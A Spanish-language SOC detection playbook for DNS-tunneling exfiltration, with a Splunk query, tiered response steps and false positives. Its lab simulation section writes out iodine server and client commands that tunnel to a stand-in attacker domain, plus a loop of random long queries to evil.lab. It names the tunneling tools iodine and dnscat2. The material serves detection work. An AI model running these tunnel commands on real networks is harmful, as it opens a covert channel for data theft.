# UC-004 — Exfiltración por DNS Tunneling

| Campo | Valor |
|-------|-------|
| ID | UC-004 |
| Táctica MITRE | Exfiltration (TA0010) |
| Técnica | T1048.003 — Exfiltration Over Unencrypted Non-C2 Protocol |
| Severidad | High |
| Fuentes | Suricata event_type=dns (SID 9000021), Zeek dns.log |
| Dueño | SOC L2 |

## 1. Contexto

DNS suele estar permitido incluso en redes muy segmentadas. Herramientas como **iodine**, **dnscat2**, **dns2tcp** encapsulan datos en subdominios largos hacia un servidor DNS controlado por el atacante.

## 2. Detección

```spl
index=soc_suricata sourcetype=suricata:eve suricata.event_type=dns
| eval qlen=len('suricata.dns.rrname')
| where qlen > 60
| stats count avg(qlen) as avg_len values(suricata.dns.rrname) as queries by src_ip
| where count > 20
```

## 3. Respuesta

### L1
1. Extraer el dominio padre (SLD) — `dig +short NS <sld>` para ver quién lo controla.
2. Verificar reputación en Cortex (`URLhaus`, `VirusTotal`).
3. Correlacionar proceso origen en host (Sysmon EID 22 — DNS query).

### L2
1. Bloquear el SLD en el resolver corporativo (RPZ).
2. Aislar host origen.
3. Análisis forense: buscar el binario responsable (`iodine`, `dnscat2`).

### L3
1. Forzar resoluciones DNS solo por resolver corporativo (bloquear 53 saliente).
2. Habilitar Passive DNS + Response Policy Zones.

## 4. Simulación

```bash
# Servidor iodine (atacante)
iodined -f -c -P testpass 10.0.0.1 tunnel.evil.lab

# Cliente (víctima)
iodine -f -P testpass tunnel.evil.lab
```

Alternativa segura para lab: generar queries largas benignas:

```bash
for i in $(seq 1 500); do
  dig $(head -c 80 /dev/urandom | base64 | tr -d '/+=' | head -c 80).evil.lab
done
```

## 5. Falsos positivos

- CDN edge nodes con subdominios largos hashcodeados (Akamai, Fastly).
- Antivirus con consultas a listas grandes (McAfee, Symantec).
